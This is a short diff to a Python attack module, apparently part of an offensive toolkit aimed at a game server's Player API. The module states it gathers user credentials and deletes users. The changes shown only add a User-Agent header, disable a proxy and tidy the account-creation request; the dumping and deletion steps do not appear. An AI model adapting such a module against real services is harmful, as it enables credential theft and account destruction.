@@ -6,13 +6,12 @@ import sys
 import hashlib
 from os import urandom
 
-
 class AtkGameCheatDumpCredentials(object):
     def __init__(self, utility, host="127.0.0.1", port="80", debug=False):
         self.utility = utility
-        self.utility.target = host
         self.host = host
         self.port = port
+        self.ua = utility.ua
         self.debug = debug
         self.description = "The module can be gather user credentials and then delete users if a Player API's bug was not fix yet."
         self.target = host + ":" + port
@@ -27,8 +26,8 @@ class AtkGameCheatDumpCredentials(object):
         num = int(num_str)
 
         #proxy
-        proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}
-        #proxies = {"http": None,"https": None}
+        #proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}
+        proxies = {"http": None,"https": None}
 
         #connect timeout, read timeout
         timeoutvalue= (5.0, 5.5)
@@ -42,8 +41,8 @@ class AtkGameCheatDumpCredentials(object):
             nickname_token = hashlib.md5(urandom(10)).hexdigest()[:10]
             set_nickname = "John" + "_" + nickname_token
 
-            json_data = { "user_name": set_id, "password": set_password, "nick_name": set_nickname}      
-            headers = { "Content-Type": "application/json" }
+            json_data = { "user_name": set_id, "password": set_password, "nick_name": set_nickname}  
+            headers = { "Content-Type": "application/json", "User-Agent": self.ua }
             target_url = "http://" + self.target + "/create"
             response1 = session.post(target_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)
 
